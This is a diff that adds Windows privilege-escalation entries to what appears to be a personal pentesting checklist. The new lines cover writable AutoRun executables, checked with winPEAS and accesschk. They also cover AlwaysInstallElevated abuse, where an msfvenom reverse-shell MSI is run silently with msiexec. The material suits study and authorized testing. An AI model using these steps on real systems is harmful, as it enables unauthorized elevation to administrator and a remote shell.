@@ -48,5 +48,24 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
    - DLL Hijacking
   
 3- Registery Exploits
+    * AutoRun executables
+      - check for writable AutoRun executables
+        > .\winPEASany.exequiet applicationsinfo
+      - then use accesschk.exe to verify the permissions on each one:
+        > .\accesschk.exe /accepteula -wvu "[file PATH]"
+    
+    * AlwaysInstallElevated
+      - NOTE: Two Registry settings must be enabled for this to work.
+        The “AlwaysInstallElevated” value must be set to 1 
+        for both the local machine:
+        HKLM\SOFTWARE\Policies\Microsoft\Windows\Installerand 
+        the current user:
+        HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+        If either of these are missing or disabled, the exploit will not work.
   
-  
+        - check both registry values by winPEAS
+          > .\winPEASany.exequiet windowscreds
+        - Then Create a new reverse shell with msfvenom, using the msi format, and save it with the .msi extension
+        -  msiexec /quiet /qn /i [the path ov created reverse shell e.g. C:\PrivEsc\reverse.msi]
+        
+4- Passwords
